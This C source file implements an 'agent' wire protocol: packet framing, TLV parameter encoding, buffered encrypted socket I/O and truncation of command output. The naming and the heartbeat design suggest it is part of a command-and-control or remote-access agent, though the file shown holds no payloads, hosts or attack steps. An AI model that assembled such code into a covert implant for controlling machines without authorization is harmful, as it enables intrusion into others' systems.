/* protocol.c - wire protocol encoding/decoding and socket I/O. */
#include "agent.h"

/* Serializes all socket writes: the ChaCha20 tx state is global, so the
 * heartbeat thread and the serve thread must not write concurrently. */
static c2a_mutex_t g_write_mu;

void c2a_mutex_init(c2a_mutex_t *m) {
#ifdef _WIN32
    InitializeCriticalSection(m);
#else
    pthread_mutex_init(m, NULL);
#endif
}

void c2a_mutex_lock(c2a_mutex_t *m) {
#ifdef _WIN32
    EnterCriticalSection(m);
#else
    pthread_mutex_lock(m);
#endif
}

void c2a_mutex_unlock(c2a_mutex_t *m) {
#ifdef _WIN32
    LeaveCriticalSection(m);
#else
    pthread_mutex_unlock(m);
#endif
}

void proto_global_init(void) {
    c2a_mutex_init(&g_write_mu);
}

/* ===================================================================== */
/* small helpers                                                         */
/* ===================================================================== */

char *xstrdup(const char *s) {
    size_t n = strlen(s) + 1;
    char *d = (char *)malloc(n);
    if (d) memcpy(d, s, n);
    return d;
}

char *printf_str(const char *fmt, ...) {
    char buf[65536];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof buf, fmt, ap);
    va_end(ap);
    if (n < 0) return xstrdup("(format error)");
    if ((size_t)n < sizeof buf) return xstrdup(buf);
    /* exact-size allocation for very long output */
    char *s = (char *)malloc((size_t)n + 1);
    if (!s) return xstrdup("(out of memory)");
    va_start(ap, fmt);
    vsnprintf(s, (size_t)n + 1, fmt, ap);
    va_end(ap);
    return s;
}

char *cap_output(const char *s) {
    static const char suffix[] = OUTPUT_TRUNCATED_MARKER;
    if (!s) return xstrdup("");
    size_t len = strlen(s);
    if (len <= MAX_OUTPUT_BYTES) return xstrdup(s);
    size_t keep = MAX_OUTPUT_BYTES - (sizeof suffix - 1);
    while (keep > 0 && ((unsigned char)s[keep] & 0xC0) == 0x80) keep--;
    char *out = (char *)malloc(keep + sizeof suffix);
    if (!out) return xstrdup("(out of memory)");
    memcpy(out, s, keep);
    memcpy(out + keep, suffix, sizeof suffix);
    return out;
}

static void bb_grow(bytebuf_t *b, size_t need) {
    size_t newcap = b->cap ? b->cap : 8192;
    while (newcap < need) newcap *= 2;
    uint8_t *nd = (uint8_t *)realloc(b->data, newcap);
    if (nd) { b->data = nd; b->cap = newcap; }
}

void bb_init(bytebuf_t *b) { b->data = NULL; b->len = 0; b->cap = 0; b->off = 0; }
void bb_free(bytebuf_t *b) { free(b->data); b->data = NULL; b->len = b->cap = b->off = 0; }

int bb_append(bytebuf_t *b, const uint8_t *d, size_t n) {
    if (b->off > 0) {
        /* compact the consumed prefix to the front before appending */
        if (b->off >= b->len) {
            b->off = 0;
            b->len = 0;
        } else {
            memmove(b->data, b->data + b->off, b->len - b->off);
            b->len -= b->off;
            b->off = 0;
        }
    }
    if (b->len + n > b->cap) bb_grow(b, b->len + n);
    if (b->len + n > b->cap) return -1; /* alloc failed */
    memcpy(b->data + b->len, d, n);
    b->len += n;
    return 0;
}

static uint64_t read_u64_le(const uint8_t *p) {
    uint64_t v = 0;
    for (int i = 7; i >= 0; i--) v = (v << 8) | p[i];
    return v;
}

static uint32_t read_u32_le(const uint8_t *p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8)
         | ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static void write_u32_le(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v & 0xff);
    p[1] = (uint8_t)((v >> 8) & 0xff);
    p[2] = (uint8_t)((v >> 16) & 0xff);
    p[3] = (uint8_t)((v >> 24) & 0xff);
}

static void write_u64_le(uint8_t *p, uint64_t v) {
    for (int i = 0; i < 8; i++) { p[i] = (uint8_t)(v & 0xff); v >>= 8; }
}

static void write_header(uint8_t *buf, uint64_t req_id, uint32_t body_len, uint8_t cmd) {
    memset(buf, 0, PACKET_HEADER_LEN);
    write_u64_le(buf, req_id);
    write_u32_le(buf + 8, body_len);
    buf[15] = cmd;
}

int bb_take_packet(bytebuf_t *b, uint64_t *req_id, uint8_t *cmd,
                   const uint8_t **body, uint32_t *body_len) {
    if (b->len - b->off < PACKET_HEADER_LEN) return 0;
    uint64_t rid = read_u64_le(b->data + b->off);
    uint32_t blen = read_u32_le(b->data + b->off + 8);
    if (blen > PROTO_MAX_BODY_LEN) return -1; /* oversized body: protocol error */
    if (b->len - b->off < PACKET_HEADER_LEN + blen) return 0;
    *req_id = rid;
    *cmd = b->data[b->off + 15];
    *body = b->data + b->off + PACKET_HEADER_LEN;
    *body_len = blen;
    b->off += PACKET_HEADER_LEN + blen;
    if (b->off >= b->len) {
        b->off = 0;
        b->len = 0;
    }
    return 1;
}

/* ===================================================================== */
/* TLV                                                                   */
/* ===================================================================== */

int tlv_encode(const char *const *params, int n, uint8_t **out, uint32_t *out_len) {
    size_t total = 0;
    int i;
    for (i = 0; i < n; i++) total += 4 + strlen(params[i]);
    uint8_t *buf = (uint8_t *)malloc(total ? total : 1);
    if (!buf) return -1;
    size_t off = 0;
    for (i = 0; i < n; i++) {
        size_t sl = strlen(params[i]);
        if (sl > UINT32_MAX) { free(buf); return -1; }
        write_u32_le(buf + off, (uint32_t)sl);
        off += 4;
        memcpy(buf + off, params[i], sl);
        off += sl;
    }
    *out = buf;
    *out_len = (uint32_t)total;
    return 0;
}

int tlv_decode(const uint8_t *body, uint32_t body_len, char ***out_params, int *out_count) {
    uint64_t off = 0;
    int n = 0;
    while (off < body_len) {
        if (off + 4 > body_len) return -1;
        uint32_t l = read_u32_le(body + off);
        if (off + 4 + (uint64_t)l > body_len) return -1;
        off += 4 + (uint64_t)l;
        n++;
    }
    char **arr = (char **)calloc((size_t)n + 1, sizeof(char *));
    if (!arr) return -1;
    off = 0;
    int k = 0;
    while (off < body_len) {
        uint32_t l = read_u32_le(body + off);
        off += 4;
        char *s = (char *)malloc((size_t)l + 1);
        if (!s) { tlv_free(arr, k); return -1; }
        memcpy(s, body + off, l);
        s[l] = 0;
        arr[k++] = s;
        off += l;
    }
    arr[k] = NULL;
    *out_params = arr;
    *out_count = n;
    return 0;
}

void tlv_free(char **params, int n) {
    if (!params) return;
    for (int i = 0; i < n; i++) free(params[i]);
    free(params);
}

/* ===================================================================== */
/* packet builders                                                       */
/* ===================================================================== */

uint8_t *build_request(uint64_t req_id, uint8_t cmd,
                       const char *const *params, int n, uint32_t *out_len) {
    uint8_t *body = NULL;
    uint32_t blen = 0;
    if (tlv_encode(params, n, &body, &blen) != 0) return NULL;
    uint32_t total = PACKET_HEADER_LEN + blen;
    uint8_t *buf = (uint8_t *)malloc(total);
    if (!buf) { free(body); return NULL; }
    write_header(buf, req_id, blen, cmd);
    if (blen) memcpy(buf + PACKET_HEADER_LEN, body, blen);
    free(body);
    *out_len = total;
    return buf;
}

uint8_t *build_response(uint64_t req_id, uint8_t cmd,
                        const char *result, size_t reslen, uint32_t *out_len) {
    uint32_t total = PACKET_HEADER_LEN + (uint32_t)reslen;
    uint8_t *buf = (uint8_t *)malloc(total);
    if (!buf) return NULL;
    write_header(buf, req_id, (uint32_t)reslen, cmd);
    if (reslen) memcpy(buf + PACKET_HEADER_LEN, result, reslen);
    *out_len = total;
    return buf;
}

uint8_t *build_data_packet(uint64_t req_id, uint8_t end_flag,
                           const uint8_t *data, size_t data_len, uint32_t *out_len) {
    uint32_t total = PACKET_HEADER_LEN + (uint32_t)data_len;
    uint8_t *buf = (uint8_t *)malloc(total);
    if (!buf) return NULL;
    write_header(buf, req_id, (uint32_t)data_len, end_flag);
    if (data_len) memcpy(buf + PACKET_HEADER_LEN, data, data_len);
    *out_len = total;
    return buf;
}

/* ===================================================================== */
/* wire io                                                               */
/* ===================================================================== */

static int send_all_locked(sockfd_t sock, const uint8_t *buf, size_t n) {
    size_t off = 0;
    if (crypto_is_enabled()) {
        uint8_t *enc = (uint8_t *)malloc(n ? n : 1);
        if (!enc) return -1;
        crypto_encrypt_buf(buf, enc, n);
        while (off < n) {
            int w = (int)send(sock, (const char *)enc + off, (int)(n - off), 0);
            if (w <= 0) { free(enc); return -1; }
            off += (size_t)w;
        }
        free(enc);
        return 0;
    }
    while (off < n) {
        int w = (int)send(sock, (const char *)buf + off, (int)(n - off), 0);
        if (w <= 0) return -1;
        off += (size_t)w;
    }
    return 0;
}

/* Thread-safe send: serializes encryption + write across threads. */
int send_all(sockfd_t sock, const uint8_t *buf, size_t n) {
    c2a_mutex_lock(&g_write_mu);
    int rc = send_all_locked(sock, buf, n);
    c2a_mutex_unlock(&g_write_mu);
    return rc;
}

int wait_sock(sockfd_t sock, int timeout_ms) {
    fd_set rfds;
    FD_ZERO(&rfds);
    FD_SET(sock, &rfds);
    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    return (int)select((int)sock + 1, &rfds, NULL, NULL, &tv);
}

int recv_more(sockfd_t sock, bytebuf_t *b) {
    char chunk[8192];
    int n = (int)recv(sock, chunk, sizeof chunk, 0);
    if (n <= 0) return 0; /* closed or error */
    if (crypto_is_enabled()) crypto_decrypt_buf((uint8_t *)chunk, (size_t)n);
    if (bb_append(b, (const uint8_t *)chunk, (size_t)n) != 0) return -1;
    return 1;
}

int take_packet_blocking(sockfd_t sock, bytebuf_t *b,
                         uint64_t *req_id, uint8_t *cmd,
                         const uint8_t **body, uint32_t *body_len, int timeout_ms) {
    for (;;) {
        int have = bb_take_packet(b, req_id, cmd, body, body_len);
        if (have != 0) return have;
        if (wait_sock(sock, timeout_ms) <= 0) return 0; /* timeout */
        int r = recv_more(sock, b);
        if (r <= 0) return -1;
    }
}
